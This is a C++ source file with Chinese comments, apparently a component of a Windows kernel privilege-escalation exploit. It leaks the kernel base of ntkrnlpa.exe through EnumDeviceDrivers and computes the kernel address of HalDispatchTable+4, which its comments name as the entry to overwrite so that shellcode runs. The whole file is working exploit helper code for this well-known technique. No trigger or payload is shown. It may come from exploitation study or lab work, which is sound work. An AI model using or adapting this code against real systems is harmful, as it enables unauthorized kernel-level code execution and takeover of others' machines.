#include "bypass.h"

/*
* getHalDispatchOffset4:
*	[+] 获取HalDispatchtable第二项的地址, 以执行shellcode
*/
DWORD32 getHalDispatchOffset4()
{
	// 获取xxx在kernel space 的基地址
	PVOID pKernelBase = getKernelBase();

	// 获取xxx在user space 的基地址
	HMODULE hUserSpaceBase = LoadLibrary("ntkrnlpa.exe");

	// 获取HalDispatchTable 在user space的地址
	PVOID pUserSpaceAddr = GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	// 算出其在 kernel space的偏移
	return (DWORD32)pKernelBase + ((DWORD32)pUserSpaceAddr - (DWORD32)hUserSpaceBase) + 0x4;
}

/*
* getKernelBase:
*	[+] 获取 ntoskrnl.exe 的基地址
*/
LPVOID getKernelBase()
{
	LPVOID  lpImageBase[1024];
	DWORD cbNeeded;
	TCHAR baseName[1024];
	// 使用EnumDeviceDriver来获取内核基地址
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &cbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		// 获取基地址的名字
		GetDeviceDriverBaseNameA(lpImageBase[i], baseName, 48);

		if (!strcmp(baseName, "ntkrnlpa.exe"))
		{
			std::cout << "[+] basename: " << baseName << std::endl;
			std::cout << "[+] ntoskrnl.exe at kernel space: " << lpImageBase[i] << std::endl;
			return lpImageBase[i];
		}

	}

	return NULL;
}